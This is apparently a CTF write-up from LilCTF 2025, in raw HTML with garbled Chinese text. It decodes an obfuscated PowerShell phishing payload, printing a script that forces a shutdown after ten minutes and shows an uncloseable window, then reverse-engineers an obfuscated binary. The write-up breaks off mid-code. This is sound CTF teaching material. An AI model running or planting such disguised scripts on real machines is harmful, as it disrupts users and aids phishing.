u$o$e+$g$q$b$d$b$i+$g$q$u$i$d$b+$g$q$x$o$q$x+$g$x$d$q$l$q+$g$z$d$i$z$b+$g$q$u$o$o$d+$g$q$z$z$i$o+$g$q$u$z$q$u+$g$z$u$z$o$u+$g$q$o$u$z$e+$g$q$u$z$b$x+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$b+$g$o$i+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$q$o$o$l$o+$g$z$x$e$b$l+$g$z$i$d$l$e+$g$o$u$x$d$e+$g$z$o+$g$o$o+$g$z$q+$g$o$l+$g$d$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$b$b$o+$g$b$b$b+$g$b$u$i+$g$b$b$d+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$i$q+$g$l$e+$g$b$b$u+$g$b$u$z+$g$b$u$b+$g$o$u+$g$x$o+$g$o$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$o+$g$z$q+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$o+$g$z$q+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$b+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$l$d+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$b$b$u+$g$o$u+$g$b$q$z+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$i+$g$l$e+$g$b$b$x+$g$b$u$b+$g$o$u+$g$o$b+$g$b$q$d+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$l$d+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$x$e+$g$b$u$i+$g$b$b$b+$g$b$b$d+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$u+$g$b$q$z+$g$b$z+$g$b$u+$g$z$q+$g$z$q+$g$z$q+$g$z$q+$g$z$x+$g$l$d+$g$o$x+$g$x$e+$g$l$e+$g$b$b$u+$g$l$l+$g$b$u$b+$g$b$u$i+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$q+$g$z$q+$g$z$q+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$l$z+$g$d$i+$g$d$i+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$o$u+$g$z$o+$g$b$l$l$i$b+$g$q$u$i$u$b+$g$z$d$e$x$i+$g$q$u$i$d$b+$g$z$i$z$i$b+$g$x$d$q$i$b+$g$z$o+$g$o$o+$g$z$q+$g$z$o+$g$q$d$d$d$q+$g$z$b$u$z$o+$g$z$o+$g$o$o+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$x$x+$g$b$b$e+$g$b$b$x+$g$b$b$x+$g$b$b$b+$g$b$b$u+$g$b$b$d+$g$l$z+$g$d$i+$g$d$i+$g$e$l+$g$e$d+$g$o$o+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$e$z+$g$l$l+$g$b$b$b+$g$b$b$u+$g$l$z+$g$d$i+$g$d$i+$g$e$z+$g$b$b$u+$g$b$u$q+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$b+$g$b$z+$g$b$u+$g$b$q$d+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$x$i+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$b$b+$g$b$u$z+$g$o$u+$g$o$b+$g$z$q+$g$b$q$o+$g$z$q+$g$e$l+$g$b$b$e+$g$b$b$x+$g$o$d+$g$e$i+$g$b$b$e+$g$b$u$i+$g$b$u$i)  &quot;  |  .$r </span><br></pre></td></tr></table></figure><br>exp_final:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. å®šä¹‰å˜é‡è¡¨ï¼ˆæŒ‰ PowerShell è„šæœ¬è®¡ç®—å‡ºæ¥çš„ç»“æœï¼‰</span></span><br><span class="line">vars_map = &#123;</span><br><span class="line">    <span class="string">&quot;u&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;q&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;z&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="string">&quot;d&quot;</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">&quot;h&quot;</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">&quot;e&quot;</span>: <span class="number">7</span>,</span><br><span class="line">    <span class="string">&quot;i&quot;</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="string">&quot;x&quot;</span>: <span class="number">6</span>,  <span class="comment"># q * z = 2 * 3</span></span><br><span class="line">    <span class="string">&quot;l&quot;</span>: <span class="number">9</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ä½ æä¾›çš„ payload æ•°ç»„ï¼ˆå»æ‰ PowerShell çš„å¼•å·ï¼‰</span></span><br><span class="line">payload_string_builder = [</span><br><span class="line"><span class="string">&quot;$g$z$x&quot;</span> , <span class="string">&quot;$g$x$i&quot;</span> , <span class="string">&quot;$g$b$u$b&quot;</span> , <span class="string">&quot;$g$l$i&quot;</span> ...</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 3. è§£ç å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_item</span>(<span class="params">expr: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># å»æ‰å‰ç¼€ $g</span></span><br><span class="line">    expr = expr.replace(<span class="string">&quot;$g&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># æå–æ‰€æœ‰å˜é‡å</span></span><br><span class="line">    parts = re.findall(<span class="string">r&quot;\$([a-z])&quot;</span>, expr)</span><br><span class="line">    num_str = <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(vars_map[p]) <span class="keyword">for</span> p <span class="keyword">in</span> parts)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">int</span>(num_str))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. æ‹¼æ¥è§£ç </span></span><br><span class="line">decoded = <span class="string">&quot;&quot;</span>.join(decode_item(expr) <span class="keyword">for</span> expr <span class="keyword">in</span> payload_string_builder)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n====================== æœ€ç»ˆåœ£æ¯ ======================&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(decoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====================================================&quot;</span>)</span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">====================== æœ€ç»ˆåœ£æ¯ ======================</span><br><span class="line">$DebugPreference = $ErrorActionPreference = $VerbosePreference = $WarningPreference = &quot;SilentlyContinue&quot;</span><br><span class="line"></span><br><span class="line">[void] [System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Windows.Forms&quot;)</span><br><span class="line">[void] [System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Drawing&quot;)</span><br><span class="line"></span><br><span class="line">shutdown /s /t 600 &gt;$Null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">$Form = New-Object System.Windows.Forms.Form</span><br><span class="line">$Form.Text = &quot;Cialloï½(âˆ Â·Ï‰&lt; )âŒ’â˜…&quot;</span><br><span class="line">$Form.StartPosition = &quot;Manual&quot;</span><br><span class="line">$Form.Location = New-Object System.Drawing.Point(40, 40)</span><br><span class="line">$Form.Size = New-Object System.Drawing.Size(720, 480)</span><br><span class="line">$Form.MinimalSize = New-Object System.Drawing.Size(720, 480)</span><br><span class="line">$Form.MaximalSize = New-Object System.Drawing.Size(720, 480)</span><br><span class="line">$Form.FormBorderStyle = &quot;FixedDialog&quot;</span><br><span class="line">$Form.BackColor = &quot;#0077CC&quot;</span><br><span class="line">$Form.MaximizeBox = $False</span><br><span class="line">$Form.TopMost = $True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$fF1IA49G = &quot;LILCTF&#123;be_ViGllANT_4G4In$T_PHl5HINg&#125;&quot;</span><br><span class="line">$fF1IA49G = &quot;N0pe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Label1 = New-Object System.Windows.Forms.Label</span><br><span class="line">$Label1.Text = &quot;:)&quot;</span><br><span class="line">$Label1.Location = New-Object System.Drawing.Point(64, 80)</span><br><span class="line">$Label1.AutoSize = $True</span><br><span class="line">$Label1.ForeColor = &quot;White&quot;</span><br><span class="line">$Label1.Font = New-Object System.Drawing.Font(&quot;Consolas&quot;, 64)</span><br><span class="line"></span><br><span class="line">$Label2 = New-Object System.Windows.Forms.Label</span><br><span class="line">$Label2.Text = &quot;è¿™é‡Œæ²¡æœ‰ flagï¼›è¿™ä¸ªçª—å£æ˜¯æ€ä¹ˆå‡ºç°çš„å‘¢ï¼Œflag å°±åœ¨é‚£é‡Œ&quot;</span><br><span class="line">$Label2.Location = New-Object System.Drawing.Point(64, 240)</span><br><span class="line">$Label2.AutoSize = $True</span><br><span class="line">$Label2.ForeColor = &quot;White&quot;</span><br><span class="line">$Label2.Font = New-Object System.Drawing.Font(&quot;å¾®è½¯é›…é»‘&quot;, 16)</span><br><span class="line"></span><br><span class="line">$Label3 = New-Object System.Windows.Forms.Label</span><br><span class="line">$Label3.Text = &quot;ä½ çš„ç”µè„‘å°†åœ¨ 10 åˆ†é’Ÿåå…³æœºï¼Œè¯·ä¿å­˜ä½ çš„å·¥ä½œ&quot;</span><br><span class="line">$Label3.Location = New-Object System.Drawing.Point(64, 300)</span><br><span class="line">$Label3.AutoSize = $True</span><br><span class="line">$Label3.ForeColor = &quot;White&quot;</span><br><span class="line">$Label3.Font = New-Object System.Drawing.Font(&quot;å¾®è½¯é›…é»‘&quot;, 16)</span><br><span class="line"></span><br><span class="line">$Form.Controls.AddRange(@($Label1, $Label2, $Label3))</span><br><span class="line"></span><br><span class="line">$Form.Add_Shown(&#123;$Form.Activate()&#125;)</span><br><span class="line">$Form.Add_FormClosing(&#123;</span><br><span class="line">    $_.Cancel = $True</span><br><span class="line">    [System.Windows.Forms.MessageBox]::Show(&quot;ä¸å…è®¸å…³é—­ï¼&quot;, &quot;æç¤º&quot;, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$Form.ShowDialog() | Out-Null</span><br><span class="line">=====================================================</span><br></pre></td></tr></table></figure><br>LILCTF{be_ViGllANT_4G4In$T_PHl5HINg}</p><h1 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a>obfusheader.h</h1><p>å­˜åœ¨å¤§é‡çš„<code>jz+1</code>çš„èŠ±ï¼š48 31 C0 74 01 00ï¼Œç›´æ¥ç”¨çš„010å…¨éƒ¨nopæ‰<br>mainåœ¨ sub_1400217E8()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">void</span> (*)(<span class="type">const</span> <span class="type">char</span> *, ...))funcs_1400247DB[*((<span class="type">unsigned</span> <span class="type">int</span> *)v586 + <span class="number">1</span>)])(<span class="string">&quot;%100s&quot;</span>, input);</span><br></pre></td></tr></table></figure><br>æµ‹è¯•è¾“å…¥é•¿åº¦<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_correct_len</span>(<span class="params">file_path</span>):</span><br><span class="line">    correct_len = []</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        test_input = <span class="string">&quot;A&quot;</span> * length</span><br><span class="line">        result = subprocess.run([file_path], capture_output=<span class="literal">True</span>,<span class="built_in">input</span>=test_input, text=<span class="literal">True</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        output=result.stdout+result.stderr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;long&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output.lower() <span class="keyword">and</span> <span class="string">&#x27;short&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Length <span class="subst">&#123;length&#125;</span> is correct&quot;</span>)</span><br><span class="line">            correct_len.append(length)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> correct_len</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    file_path = <span class="string">r&quot;D:\LeStoreDownload\webpage\CTF\2025 0815-0817 LilCTF\obfusheader.h\hello-obf.exe&quot;</span></span><br><span class="line">    correct_lengths = find_correct_len(file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct lengths found:&quot;</span>, correct_lengths)</span><br><span class="line"><span class="comment"># Length 40 is correct</span></span><br><span class="line"><span class="comment"># Correct lengths found: [40]</span></span><br></pre></td></tr></table></figure><br>åœ¨inputä¸Šä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼Œè§¦å‘çš„å‡½æ•°ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">str_1len</span><span class="params">(_BYTE *j)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = j; *i; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> (_BYTE *)(i - j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç¬¬äºŒæ¬¡æ–­ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_7FF7DF407842</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a2 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 &gt;&gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_WORD *)(<span class="number">2LL</span> * i + a1) ^= rand();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨srand()ä¸Šä¸‹æ–­ç‚¹å¾—åˆ°seedï¼š0x048691412</p><p>ç¬¬ä¸‰æ¬¡æ–­ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7DF4078B1</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 i_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 k_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> Character[<span class="number">36</span>]; <span class="comment">// [rsp+20h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+B1h] [rbp-Fh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+B2h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [rsp+B3h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+B4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; i_1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_BYTE *)(a1 + i);</span><br><span class="line">    v5 = <span class="number">16</span> * v6;</span><br><span class="line">    v4 = v6 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = (v6 &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i_1; ++j )</span><br><span class="line">    *(_BYTE *)(a1 + j) = ~*(_BYTE *)(a1 + j);</span><br><span class="line">  <span class="built_in">memcpy</span>(Character, &amp;unk_7FF7DF435060, <span class="number">0x88u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    k_1 = k;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)k &gt; <span class="number">0x21</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(Character[k]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> k_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨memcmpä¸‹ç¡¬ä»¶æ–­ç‚¹è¿½åˆ°cmp()å¥½å§ä¸€æ­¥ä¸€æ­¥åº”è¯¥ä¹Ÿèƒ½è°ƒè¿‡å»ä½†æ˜¯æˆ‘æ²¡è°ƒçš„è¿‡å»ï¼š<code>loc_7FF88298B0A0</code><br>å¾—åˆ°cipherï¼š<code>5CAFB01CFCEFC78F0188343941CB472D0E48FD8D7D0FD0FAF83D81FDF69E06B9AB7B40EB65B9DF1B</code></p><p>åŒæ„ï¼š<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="number">0x48691412</span></span><br><span class="line">n=<span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_crt</span>():</span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:</span><br><span class="line">        crt = ctypes.CDLL(<span class="string">&#x27;msvcrt.dll&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        crt = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    crt.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">    crt.rand.restype = ctypes.c_uint</span><br><span class="line">    <span class="keyword">return</span> crt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand16</span>(<span class="params">crt</span>):</span><br><span class="line">    <span class="keyword">return</span> (crt.rand() &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 